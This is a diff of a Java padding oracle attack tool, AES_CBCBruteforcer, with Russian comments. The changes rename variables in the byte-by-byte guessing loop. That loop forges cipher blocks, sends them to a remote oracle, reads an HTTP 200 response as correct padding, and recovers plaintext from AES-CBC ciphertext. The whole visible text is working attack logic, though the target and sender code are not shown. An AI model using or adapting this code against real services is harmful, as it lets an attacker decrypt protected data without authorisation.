@@ -65,29 +65,29 @@ public class AES_CBCBruteforcer {
 
                 for (int i = 1; !error && i < blocksCount; i++) {
                     decodeInfo.currentBlock.set(i);
-                    byte[] I2 = new byte[AES_BLOCK_SIZE];
-                    int I2cnt = AES_BLOCK_SIZE - 1;
+                    byte[] G = new byte[AES_BLOCK_SIZE];
+                    int G_cnt = AES_BLOCK_SIZE - 1;
 
                     for (int b = 0; !error && b < 16; b++) { //по байтам
                         decodeInfo.currentByte.set(b);
                         for (int g = 0; g < 256; g++) { //по 1 байту
                             //C1`
-                            byte[] C1d = new byte[AES_BLOCK_SIZE];
+                            byte[] C1 = new byte[AES_BLOCK_SIZE];
 
                             byte[] Pad = paddings.get(b).clone();
-                            System.arraycopy(Pad, 0, C1d, AES_BLOCK_SIZE - Pad.length, Pad.length);//C1..|..Pad
+                            System.arraycopy(Pad, 0, C1, AES_BLOCK_SIZE - Pad.length, Pad.length);//C1..|..Pad
 
-                            C1d[AES_BLOCK_SIZE - Pad.length] = (byte) (C1d[AES_BLOCK_SIZE - Pad.length] ^ g);//01^j
+                            C1[AES_BLOCK_SIZE - Pad.length] = (byte) (C1[AES_BLOCK_SIZE - Pad.length] ^ g);//01^j
                             if (b != 0) {
                                 for (int p = 0; p < AES_BLOCK_SIZE; p++) {
-                                    C1d[p] = (byte) (C1d[p] ^ I2[p]);
+                                    C1[p] = (byte) (C1[p] ^ G[p]);
                                 }
                             }
 
                             byte[] tempFile = new byte[AES_BLOCK_SIZE * 2];
                             byte[] C2 = fileBlocks.get(i);
 
-                            System.arraycopy(C1d, 0, tempFile, 0, AES_BLOCK_SIZE);
+                            System.arraycopy(C1, 0, tempFile, 0, AES_BLOCK_SIZE);
                             System.arraycopy(C2, 0, tempFile, AES_BLOCK_SIZE, AES_BLOCK_SIZE); //C1` + C2
 
                             Callable<Integer> callable = new FileSender(tempFile);
@@ -103,7 +103,7 @@ public class AES_CBCBruteforcer {
                             }
 
                             if (response == 200) {
-                                I2[I2cnt--] = (byte) g;
+                                G[G_cnt--] = (byte) g;
                                 progress += 255 - g;
                                 break;
                             } else if (g == 255) {
@@ -117,7 +117,7 @@ public class AES_CBCBruteforcer {
 
                     byte[] C1 = fileBlocks.get(i - 1).clone();
                     for (int p = 0; p < AES_BLOCK_SIZE; p++) {
-                        C1[p] = (byte) (C1[p] ^ I2[p]);
+                        C1[p] = (byte) (C1[p] ^ G[p]);
                     }
                     if ((i + 1) == blocksCount) { //последний блок                        
                         int nToDeleteBytes = C1[AES_BLOCK_SIZE - 1];
